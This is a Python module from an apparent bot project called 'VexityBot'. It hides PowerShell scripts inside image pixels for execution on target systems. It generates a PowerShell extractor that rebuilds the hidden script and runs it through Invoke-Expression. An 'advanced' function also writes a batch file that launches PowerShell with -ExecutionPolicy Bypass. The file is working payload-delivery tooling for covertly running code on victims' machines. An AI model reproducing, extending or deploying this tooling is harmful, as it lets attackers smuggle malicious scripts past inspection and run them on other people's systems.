# ADDED - VexityBot Steganography Module
# This module provides functionality to hide PowerShell scripts within images
# and extract them for execution on target systems

import os
import sys
import base64
from PIL import Image
import io
import struct

class VexityBotSteganography:
    """VexityBot Steganography System for hiding scripts in images"""
    
    def __init__(self):
        self.supported_formats = ['.png', '.jpg', '.jpeg', '.bmp']
        self.script_extension = '.ps1'
    
    def hide_script_in_image(self, script_path, image_path, output_path, exec_path=None):
        """
        Hide a PowerShell script within an image using steganography
        
        Args:
            script_path (str): Path to the PowerShell script to hide
            image_path (str): Path to the image file to use as carrier
            output_path (str): Path where the modified image will be saved
            exec_path (str): Path where the image will be executed from (for payload generation)
        
        Returns:
            str: PowerShell one-liner command to extract and execute the script
        """
        try:
            # Read the script content
            with open(script_path, 'r', encoding='utf-8') as f:
                script_content = f.read()
            
            # Convert script to bytes
            script_bytes = script_content.encode('utf-8')
            
            # Load the image
            img = Image.open(image_path)
            img = img.convert('RGB')  # Ensure RGB mode
            
            width, height = img.size
            total_pixels = width * height
            
            # Check if image is large enough
            required_pixels = len(script_bytes) * 2  # 2 pixels per byte (4 bits each)
            if total_pixels < required_pixels:
                raise ValueError(f"Image too small. Need {required_pixels} pixels, got {total_pixels}")
            
            # Create a copy of the image
            modified_img = img.copy()
            pixels = list(modified_img.getdata())
            
            # Embed the script length first (4 bytes)
            length_bytes = struct.pack('<I', len(script_bytes))
            for i in range(4):
                byte_value = length_bytes[i]
                pixel_index = i * 2
                if pixel_index < len(pixels):
                    # Embed in R and G channels (4 bits each)
                    r, g, b = pixels[pixel_index]
                    new_r = (r & 0xF0) | (byte_value >> 4)
                    new_g = (g & 0xF0) | (byte_value & 0x0F)
                    pixels[pixel_index] = (new_r, new_g, b)
            
            # Embed the script content
            for i, byte_value in enumerate(script_bytes):
                pixel_index = (i + 4) * 2  # Start after length bytes
                if pixel_index < len(pixels):
                    r, g, b = pixels[pixel_index]
                    new_r = (r & 0xF0) | (byte_value >> 4)
                    new_g = (g & 0xF0) | (byte_value & 0x0F)
                    pixels[pixel_index] = (new_r, new_g, b)
            
            # Update the image with modified pixels
            modified_img.putdata(pixels)
            
            # Save the modified image
            modified_img.save(output_path, 'PNG')
            modified_img.close()
            
            # Generate PowerShell execution command
            if exec_path is None:
                exec_path = output_path
            
            ps_command = self._generate_ps_execution_command(exec_path, width, height, len(script_bytes))
            
            return ps_command
            
        except Exception as e:
            raise Exception(f"Error hiding script in image: {str(e)}")
    
    def _generate_ps_execution_command(self, image_path, width, height, script_length):
        """Generate PowerShell command to extract and execute hidden script"""
        
        # Escape the path for PowerShell
        escaped_path = image_path.replace('\\', '\\\\')
        
        ps_command = f'''
# VexityBot Steganography Payload Extractor
$img = New-Object System.Drawing.Bitmap("{escaped_path}")
$width = {width}
$height = {height}
$scriptLength = {script_length}
$payload = New-Object byte[] $scriptLength

# Extract length first
$lengthBytes = New-Object byte[] 4
for ($i = 0; $i -lt 4; $i++) {{
    $pixel = $img.GetPixel($i * 2, 0)
    $lengthBytes[$i] = [byte]([math]::Floor(($pixel.R -band 0x0F) * 16) + ($pixel.G -band 0x0F))
}}

# Verify length
$extractedLength = [BitConverter]::ToUInt32($lengthBytes, 0)
if ($extractedLength -ne $scriptLength) {{
    Write-Error "Length mismatch: expected $scriptLength, got $extractedLength"
    exit 1
}}

# Extract script content
for ($i = 0; $i -lt $scriptLength; $i++) {{
    $pixelIndex = ($i + 4) * 2
    $x = $pixelIndex % $width
    $y = [math]::Floor($pixelIndex / $width)
    if ($y -lt $height) {{
        $pixel = $img.GetPixel($x, $y)
        $payload[$i] = [byte]([math]::Floor(($pixel.R -band 0x0F) * 16) + ($pixel.G -band 0x0F))
    }}
}}

$img.Dispose()

# Execute the extracted script
$scriptContent = [System.Text.Encoding]::UTF8.GetString($payload[0..($scriptLength-1)])
Invoke-Expression $scriptContent
'''
        
        return ps_command.strip()
    
    def create_simple_payload(self, script_content, image_path, output_path):
        """
        Create a simple steganography payload using the provided PowerShell scripts
        
        Args:
            script_content (str): The PowerShell script content to hide
            image_path (str): Path to the image file
            output_path (str): Path for the output image
        
        Returns:
            str: PowerShell execution command
        """
        try:
            # Save script to temporary file
            temp_script = os.path.join(os.path.dirname(output_path), 'temp_script.ps1')
            with open(temp_script, 'w', encoding='utf-8') as f:
                f.write(script_content)
            
            # Use the main hiding function
            result = self.hide_script_in_image(temp_script, image_path, output_path)
            
            # Clean up temp file
            if os.path.exists(temp_script):
                os.remove(temp_script)
            
            return result
            
        except Exception as e:
            raise Exception(f"Error creating simple payload: {str(e)}")
    
    def create_advanced_payload(self, script_path, image_path, output_path, exec_path=None):
        """
        Create an advanced steganography payload with the provided PowerShell scripts
        
        Args:
            script_path (str): Path to the PowerShell script
            image_path (str): Path to the image file
            output_path (str): Path for the output image
            exec_path (str): Execution path for the payload
        
        Returns:
            tuple: (ps_command, batch_command)
        """
        try:
            # Generate the PowerShell execution command
            ps_command = self.hide_script_in_image(script_path, image_path, output_path, exec_path)
            
            # Create a batch file wrapper
            batch_content = f'''@echo off
powershell.exe -ExecutionPolicy Bypass -Command "{ps_command.replace(chr(10), '; ')}"
'''
            
            batch_path = output_path.replace('.png', '_executor.bat')
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            return ps_command, batch_path
            
        except Exception as e:
            raise Exception(f"Error creating advanced payload: {str(e)}")
    
    def validate_image(self, image_path):
        """Validate if an image is suitable for steganography"""
        try:
            img = Image.open(image_path)
            width, height = img.size
            total_pixels = width * height
            
            # Check if it's a supported format
            ext = os.path.splitext(image_path)[1].lower()
            if ext not in self.supported_formats:
                return False, f"Unsupported format: {ext}"
            
            # Check minimum size (at least 100x100 pixels)
            if total_pixels < 10000:
                return False, "Image too small (minimum 100x100 pixels required)"
            
            return True, f"Valid image: {width}x{height} pixels"
            
        except Exception as e:
            return False, f"Invalid image: {str(e)}"
    
    def get_max_script_size(self, image_path):
        """Calculate maximum script size that can be hidden in the image"""
        try:
            img = Image.open(image_path)
            width, height = img.size
            total_pixels = width * height
            
            # Reserve 4 pixels for length, rest for script content
            # Each byte needs 2 pixels (4 bits per pixel)
            max_script_bytes = ((total_pixels - 8) // 2) - 4  # Reserve 4 bytes for length
            
            return max_script_bytes
            
        except Exception as e:
            return 0

# ADDED - Utility functions for integration
def create_steganography_payload(script_content, image_path, output_path):
    """Convenience function to create a steganography payload"""
    stego = VexityBotSteganography()
    return stego.create_simple_payload(script_content, image_path, output_path)

def create_advanced_steganography_payload(script_path, image_path, output_path, exec_path=None):
    """Convenience function to create an advanced steganography payload"""
    stego = VexityBotSteganography()
    return stego.create_advanced_payload(script_path, image_path, output_path, exec_path)
